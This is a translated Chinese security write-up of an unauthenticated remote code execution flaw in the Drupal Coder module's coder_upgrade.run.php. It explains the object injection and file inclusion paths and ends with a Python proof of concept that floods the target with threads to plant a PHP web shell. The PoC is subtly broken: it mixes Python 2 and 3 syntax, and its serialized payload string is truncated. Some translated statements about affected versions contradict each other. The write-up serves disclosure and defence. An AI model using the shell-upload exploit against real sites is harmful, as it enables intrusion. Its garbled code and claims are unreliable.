# Drupal Coder模块存在未经身份验证的远程代码执行漏洞

#### 译文声明
本文为翻译文章，原文作者：Nick Bloor
来源链接：[原文链接](请提供原文链接)
译文仅供参考，具体内容以原文为准。

在对Coder模块的安全代码进行审查时，我发现了一个未经过身份验证的远程代码执行（RCE）漏洞。此漏洞被记录在Drupal安全公告SA-CONTRIB-2016-039中。受影响的版本包括7.x-1.3及更早版本和7.x-2.6之前的版本。据估计约有4,000个网站使用了该模块。

### 漏洞本质
问题的核心在于该模块包含了一段危险的PHP脚本，允许无任何身份验证直接访问。这段脚本原本是为了修改PHP源代码而设计，并不应该对外公开发布。从安全角度来看，这个脚本编写得非常不规范。开发者（他还编写了一个“安全代码审查”模块）没有实现任何代码来保护或限制对该脚本的访问。当我报告这个问题时，开发者拒绝承认存在问题，并坚持认为脚本运行正常！

### 简易说明
易受攻击的脚本位于`coder/coder_upgrade/scripts/coder_upgrade.run.php`路径下，可以直接访问且不受Drupal内置安全控制（如身份验证和授权）的限制。此外，该脚本几乎没有任何输入验证，导致以下多种漏洞：
- PHP对象注入
- 使用已被弃用并最终移除的PHP变量功能
- 目录遍历
- 本地文件包含
- 日志文件污染

通常情况下，日志文件和本地文件的可访问性意味着可以执行远程代码。然而，在这种情况下，被感染的日志文件会在触发本地文件之前被覆盖，从而执行日志文件中的代码。幸运的是，被感染日志文件的路径保持不变，请求也不会改变。多线程机制还意味着一个服务器线程的日志文件被感染后，其他线程仍有时间暂停并清除日志文件，但在本地文件仍然包含漏洞的情况下仍可能导致远程代码执行。

### RCE：远程代码执行
我在审查各种Drupal插件安全漏洞时发现了这一问题。Drupal插件的代码通常存放在`.module`或`.inc`扩展名的文件中。这样做的好处是，如果直接请求这些文件（例如扩展名为`.php`），则不会执行代码，只有当Drupal明确包含这些文件时才会执行（因此受到Drupal内置安全机制的管理）。

许多模块都包含`.php`文件，但它们通常只定义函数和类，直接请求时不会执行有意义的代码。编码器模块包含184个`.php`文件，我编写了一个脚本来标记这些文件，以便找出在直接请求/执行时起作用的文件。当我在编码器模块中运行此脚本时，发现了`coder/coder_upgrade/scripts/coder_upgrade.run.php`。快速浏览这个文件可以发现大量可能被执行的代码，而且没有明显的错误，因此需要进行更深入的代码审查。

### 漏洞利用过程
脚本首先调用`save_memory_usage()`函数，定义常量，设置一些PHP配置，并注册错误/异常处理器。接下来创建一个名为`$path`的变量，由稍后在脚本中定义的`extract_arguments()`函数返回的值初始化。如果`$path`为空，则脚本会返回一条消息并终止。为了进一步执行代码，我们需要将`$path`设置为非空值。

脚本使用`file_get_contents()`读取给定路径的文件内容，并将其传递给`unserialize()`函数，结果存储在`$parameters`变量中。默认情况下，PHP允许文件处理函数打开URL（见`allow_url_fopen`），因此我们可以使用任意URL让脚本读取数据并传递给`unserialize()`。这非常危险，因为它可能导致PHP对象注入攻击。此时，我们已经可以控制`$parameters`变量的内容。

值得注意的是，PHP文件系统功能支持多种协议封装，特别是`data://`协议，它允许数据以Base64编码形式直接读取，这意味着服务器不需要出站HTTP(S)或FTP连接。

上述循环将`$parameters`视为数组，并在执行后通过更改`$parameters`的位置来控制脚本中的每个变量。这种循环结合常量字符串和变量构造几个可控路径，并将每个路径传递给要执行的PHP代码指令。由于我们控制了无需验证的`$_coder_upgrade_modules_base`变量，因此可以利用有限的本地文件包含（LFI）漏洞。

不幸的是，要通过此LFI漏洞执行任意代码，我们需要控制特定的本地文件路径：
- `/coder/coder_upgrade/coder_upgrade.inc`
- `/coder/coder_upgrade/includes/main.inc`
- `/coder/coder_upgrade/includes/utility.inc`

在PHP 5.3.4版本中（发布于2010年12月），可以利用文件路径截断来选择任意本地文件，理论上可以执行任意代码。

### 检测网站是否易受攻击
如果安装的编码器模块版本低于7.x-1.3或7.x-2.6，则无论该模块是否启用，网站都容易受到未经身份验证的远程代码执行攻击。可以通过请求响应来确定网站是否易受攻击。如果脚本返回的确切字符串与文件参数不匹配，则该网站是危险的。可能的脚本安装路径如下：
- `[drupal-root]/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php`
- `[drupal-root]/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php`
- `[drupal-root]/sites/default/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php`
- `[drupal-root]/sites/[site-name]/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php`

其中，`[drupal-root]`是Drupal可访问的URL，`[site-name]`用于标识单个站点名称。

Nessus插件已发布用于检测此漏洞，但它目前似乎只能检查前两个默认安装路径。

### 概念证明
以下是我的概念证明代码。它生成多个线程，反复向脆弱脚本发送有效载荷，直到触发条件满足并在服务器上写入最小的PHP命令外壳程序。

```python
import base64
import urllib
import threading
import sys

# 检查目标参数
if len(sys.argv) != 2:
    print("Usage: drupal-coder-shellupload.py <target>")
    print("  e.g. drupal-coder-shellupload.py http://www.somedrupalsite.org")
    sys.exit()

# 目标URL - 必须指向Drupal安装的基础目录
target = sys.argv[1]
if target[-1] == "/":
    target = target[:-1]  # 去掉末尾的斜杠

# 构造我们的$parameters数组并序列化生成的有效载荷
payload = "data://text/plain;base64," + base64.b64encode(
    'a:7:{s:5:"paths";a:3:{s:10:"files_base";s:28:"../../../../../default/files";s:14:"libraries_base";s:21:"../../../../libraries";s:12:"modules_base";s:8:"../../..";}s:9:"variables";a:0:{}s:11:"theme_cache";s:0:"";s:8:"upgrades";a:1:{s:20:"race-execpoisonedlog";a:3:{s:6:"module";s:20:"race-execpoisonedlog";s:4:"path";s:42:"../../../../../default/files/coder_upgrade";s:5:"files";a:1:{i:0;s:10:"memory.txt";}}}s:10:"extensions";a:1:{s:11:"placeholder";s:0:"";}s:5:"items";a:1:{s:11:"placeholder";s:0:"";}s:5:"usage";s:116:"');chmod('x.php',0755); ?>";}'
)

# 检查漏洞是否成功（即是否存在已放置的shell）
def checkSuccess():
    result = False
    urlReader = urllib.urlopen(target + "/sites/all/modules/coder/coder_upgrade/scripts/x.php")
    if urlReader.getcode() == 200:
        result = True
    urlReader.close()
    return result

# 攻击线程
def attackThread():
    while not checkSuccess():
        urlReader = urllib.urlopen(target + "/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php?" + urllib.urlencode({"file": payload}))
        response = urlReader.read()
        urlReader.close()

# 生成多个线程尝试触发竞态条件
attackThreads = []
for i in range(50):
    attackThreads.append(threading.Thread(target=attackThread))
    attackThreads[i].start()

for i in range(50):
    attackThreads[i].join()

print("Exploit successful!")
print(f"A command shell should be available now at {target}/sites/all/modules/coder/coder_upgrade/scripts/x.php")
print("Pass commands to execute via the '1' GET parameter, e.g., ?1=ls")
```

### 修复建议
该模块中存在固有的危险PHP脚本，本不应该发布到生产服务器上。理想情况下，应从所有生产服务器上删除编码器模块；或者将该模块更新至7.x-1.3或7.x-2.6版本。

在安全公告发布之后，研究员Mehmet Ince (@mdisec)对该模块进行了进一步分析（文章发表在土耳其），并通过`shell_exec()`调用找到了更好的RCE路径。